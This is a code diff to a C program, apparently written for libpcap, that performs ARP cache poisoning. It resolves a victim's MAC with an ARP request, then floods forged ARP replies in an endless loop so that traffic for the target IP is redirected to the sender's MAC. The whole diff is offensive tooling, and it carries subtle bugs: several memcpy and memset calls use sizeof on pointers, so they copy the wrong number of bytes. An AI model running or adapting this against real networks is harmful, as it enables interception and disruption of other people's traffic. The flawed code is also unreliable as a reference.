@@ -50,7 +50,7 @@ int main(int argc, char* argv[]) {
 	unsigned char* myMAC;
 	unsigned char* senderIP;
 	unsigned char* targetIP;
-	unsigned char targetMAC[6];
+	unsigned char senderMAC[6];
 	struct ethhdr *sender_ehdr;
 	unsigned char* sendpacket = (unsigned char*)malloc(42);
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -75,19 +75,21 @@ int main(int argc, char* argv[]) {
 	memcpy(sendpacket+0x16, myMAC, sizeof(myMAC));
 	memcpy(sendpacket+0x1c, myIP, sizeof(myIP)); 
 	memcpy(sendpacket+0x20, MACno, sizeof(MACno));	
-	memcpy(sendpacket+0x26, targetIP, sizeof(targetIP));
+	memcpy(sendpacket+0x26, senderIP, sizeof(senderIP));
 	
 	pcap_t *fp;
 
 	fp= pcap_open_live(dev, 65535, 0, 1000, errbuf);
 	pcap_sendpacket(fp, sendpacket, 42); 
+
 	while(true) {
 		const u_char* packet;
 		struct pcap_pkthdr* header;
 		int res = pcap_next_ex(fp, &header, &packet);
-		if(packet[0x0c]==0x08 && packet[0x0d]== 0x06 && packet[0x14]==0x00 && packet[0x15]==0x02 && packet[0x1c]==targetIP[0] && packet[0x1d]==targetIP[1] && packet[0x1e]==targetIP[2] && packet[0x1f]==targetIP[3]) {
+		myMAC = getMyMacaddr(dev);
+		if(packet[0x0c]==0x08 && packet[0x0d]== 0x06 && packet[0x14]==0x00 && packet[0x15]==0x02 && packet[0]==myMAC[0] && packet[1]==myMAC[1] && packet[2]==myMAC[2] && packet[3]==myMAC[3] && packet[4]==myMAC[4] && packet[5]==myMAC[5]) {
 		for(i=0; i<6; i++) {
-			targetMAC[i] = packet[0x16+i];
+			senderMAC[i] = packet[0x16+i];
 		}
 		break;
 		}
@@ -95,7 +97,7 @@ int main(int argc, char* argv[]) {
 	memset(sendpacket, 0, sizeof(sendpacket));
 	myMAC = getMyMacaddr(dev);
 
-	memcpy(sendpacket, targetMAC, sizeof(targetMAC));
+	memcpy(sendpacket, senderMAC, sizeof(senderMAC));
 	memcpy(sendpacket+0x06, myMAC, sizeof(myMAC));
 	memcpy(sendpacket+0x0c, ETHERTYPE, sizeof(ETHERTYPE));
 	memcpy(sendpacket+0x0e, ETHERNET, sizeof(ETHERNET));
@@ -104,13 +106,13 @@ int main(int argc, char* argv[]) {
 	memcpy(sendpacket+0x13, &PROTOCOLSIZE, sizeof(PROTOCOLSIZE));
 	memcpy(sendpacket+0x14, ARPREPLY, sizeof(ARPREPLY));
 	memcpy(sendpacket+0x16, myMAC, sizeof(myMAC));
-	memcpy(sendpacket+0x1c, senderIP, sizeof(senderIP)); 
-	memcpy(sendpacket+0x20, targetMAC, sizeof(targetMAC));	
-	memcpy(sendpacket+0x26, targetIP, sizeof(targetIP));
+	memcpy(sendpacket+0x1c, targetIP, sizeof(targetIP)); 
+	memcpy(sendpacket+0x20, senderMAC, sizeof(senderMAC));	
+	memcpy(sendpacket+0x26, senderIP, sizeof(senderIP));
 
 	while(true) {
 		pcap_sendpacket(fp, sendpacket, 42);
-		printf("send OK\n");
+		//printf("send OK\n");
 	}
 
 
@@ -153,8 +155,6 @@ char* getMyIP(char* dev) {
 	ioctl(sock, SIOCGIFADDR, &ifr);
 
 	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, IPaddr, sizeof(struct sockaddr));
-
-	printf("%s\n", IPaddr);
 
 	return IPaddr;
 }
